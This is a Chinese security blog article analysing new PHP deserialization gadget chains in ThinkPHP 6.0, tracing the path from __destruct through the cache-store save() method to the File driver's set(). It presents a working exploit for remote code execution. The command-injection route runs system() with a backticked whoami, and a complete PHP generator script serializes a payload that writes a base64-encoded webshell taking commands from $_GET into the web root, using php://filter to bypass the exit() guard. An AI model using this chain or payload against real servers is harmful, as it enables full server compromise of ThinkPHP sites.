# Thinkphp 6.0 新的Gadget

阅读量 **1275211**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-12-03 14:30:25

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t015f594d796249fa0b.jpg)

网上关于thinkphp pop 链的分析大概都是将下面几篇文章自己复现了一遍

<https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/>

<https://github.com/Nu1LCTF/n1ctf-2019/tree/master/WEB/sql_manage>

<https://www.anquanke.com/post/id/187332>

<https://www.anquanke.com/post/id/187393>

下面补充thinkphp 6.0 下面的几条新链

搜索`__destruct`

![](https://p1.ssl.qhimg.com/t0134abd817488b8436.png)

在`__destruct`中调用了`$this->save()` 接下来我们去找子类中哪些实现了`save` 方法

![](https://p3.ssl.qhimg.com/t016d0134e543f28ffb.png)

通过find Usages 查看哪些类extends 了AbstractCache

![](https://p0.ssl.qhimg.com/t01b1e90c5095b358a8.png)

    
    
    public function getForStorage()
        {
            $cleaned = $this->cleanContents($this->cache);
    
            return json_encode([$cleaned, $this->complete]);
        }
    
    
    
    public function cleanContents(array $contents)
        {
            $cachedProperties = array_flip([
                'path', 'dirname', 'basename', 'extension', 'filename',
                'size', 'mimetype', 'visibility', 'timestamp', 'type',
            ]);
    
            foreach ($contents as $path => $object) {
                if (is_array($object)) {
                    $contents[$path] = array_intersect_key($object, $cachedProperties);
                }
            }
    
            return $contents;
        }
    

array_flip 是将键值进行翻转

array_intersect_key 计算交集

`$this->getForStorage()` 可控, 将要cache的内容转化成`json`格式

    
    
     public function save()
        {
            $contents = $this->getForStorage();
    
            $this->store->set($this->key, $contents, $this->expire);
        }
    

`$this->store` 可控，set可能能触发`__call`， 但是如果某个class 本身set 就会做一些危险操作也是利用的，这里我找到了

![](https://p2.ssl.qhimg.com/t01a7f7d18bda14001b.png)

    
    
    public function set($name, $value, $expire = null): bool
        {
            $this->writeTimes++;
    
            if (is_null($expire)) {
                $expire = $this->options['expire'];
            }
    
            $expire   = $this->getExpireTime($expire);
            $filename = $this->getCacheKey($name);
    
            $dir = dirname($filename);
    
            if (!is_dir($dir)) {
                try {
                    mkdir($dir, 0755, true);
                } catch (Exception $e) {
                    // 创建失败
                }
            }
    
            $data = $this->serialize($value);
    
            if ($this->options['data_compress'] && function_exists('gzcompress')) {
                //数据压缩
                $data = gzcompress($data, 3);
            }
    
            $data   = "<?phpn//" . sprintf('%012d', $expire) . "n exit();?>n" . $data;
            $result = file_put_contents($filename, $data);
    
            if ($result) {
                clearstatcache();
                return true;
            }
    
            return false;
        }
    

这里有两种利用方式

1.利用 $this->serialize

    
    
    protected function serialize($data): string
        {
            if (is_numeric($data)) {
                return (string) $data;
            }
    
            $serialize = $this->options['serialize'][0] ?? "OpisClosureserialize";
    
            return $serialize($data);
        }
    

这里`$serizlize` 是可控的，`$data` 会被转换成json，有没有办法利用呢？

答案是有的，利用system

![](https://p5.ssl.qhimg.com/t013e4ab900ab63b1b9.png)

最后相当于执行的是

    
    
    system('{"1":"`whoami`"}');
    

在shell里面，`的优先级是高于”的，所以会先执行whoami 然后再将执行结果拼接成一个新的命令

2.利用写文件写个shell

    
    
    public function getCacheKey(string $name): string
        {
            $name = hash($this->options['hash_type'], $name);
    
            if ($this->options['cache_subdir']) {
                // 使用子目录
                $name = substr($name, 0, 2) . DIRECTORY_SEPARATOR . substr($name, 2);
            }
    
            if ($this->options['prefix']) {
                $name = $this->options['prefix'] . DIRECTORY_SEPARATOR . $name;
            }
    
            return $this->options['path'] . $name . '.php';
        }
    

会根据hash的类型进行hash，然后和path进行拼接，所以文件名的前缀我们是可控的。

`$data = $this->serialize($value);` 还会再处理一次，可以用一些字符串函数比如serialize, strip_tags
等

但是会发现在写的php前面有个`exit();` ，可以通过伪协议绕过。

这里面会有几个小坑，第一个要在payload前面填充几个字符，将前面凑成4的倍数，payload编码的base64不要以=结尾，因为后面还有拼接的东西。

    
    
    <?php
    
    namespace thinkfilesystem{
        class CacheStore{
            protected $store;
    
            protected $key;
    
            protected $expire;
    
            protected $cache;
    
            protected $complete;
            protected $autosave;
    
            public function __construct($store){
                $this->store = $store;
                $this->autosave = false;
                $this->key = "haha";
                $this->cache = ["ppp"];
                $this->complete = "xxxxxPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/PmYK";
            }
        }
    }
    
    namespace thinkcachedriver{
    
        class File{
            protected $writeTimes = 0;
            protected $options;
            protected $expire;
    
            public function __construct()
            {
                $this->options = [
                    'expire' => 2333,
                    'hash_type' => "md5",
                    'cache_subdir' => false,
                    'prefix' => false,
                    'path' => 'php://filter/convert.base64-decode/resource=/var/www/html/public/tmp/592dc1993715d4b8b3be46b75a8a0860/',
                    'serialize' => false,
                    'data_compress' => false,
                    'serialize' => ['serialize']
                ];
            }
        }
    }
    
    
    namespace {
        $store = new thinkcachedriverFile();
        $cache = new thinkfilesystemCacheStore($store);
        $s = serialize($cache);
        echo $s;
        echo base64_encode($s);
    }
    

system 可以参考上面的自己写一个。另外thinkphp 5.2.x 写shell的gadget，也是可以利用的，需要稍微改一下。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wuwuwuxxxxx** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/194036](/post/id/194036)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [PHP](/tag/PHP)

 **+1** __13赞

 __收藏

![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg) wuwuwuxxxxx

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

